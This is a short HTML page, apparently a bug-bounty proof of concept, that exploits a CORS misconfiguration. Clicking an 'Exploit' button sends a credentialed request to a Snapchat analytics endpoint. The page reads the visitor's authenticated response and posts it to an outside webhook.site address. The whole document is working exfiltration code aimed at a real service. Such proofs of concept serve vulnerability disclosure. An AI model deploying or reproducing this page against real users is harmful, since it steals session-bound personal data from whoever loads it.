<html>
    <body>
        <h2>CORS PoC</h2>
        <div id="demo">
            <button type="button" onclick="cors()">Exploit</button>
        </div>
        <script>
            function cors() {
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    appendToFile(this.responseText);
                }
            };
            xhr.open("POST", "https://us-central1-gcp.api.snapchat.com/web-analytics/web/init_client", true);
            xhr.withCredentials = true;
            xhr.send();
            }

            function appendToFile(content) {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "https://webhook.site/55443beb-c33d-4293-bc88-7da51b16342c", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.send("content=" + encodeURIComponent(content)); 
            }
        </script>
    </body>
</html>
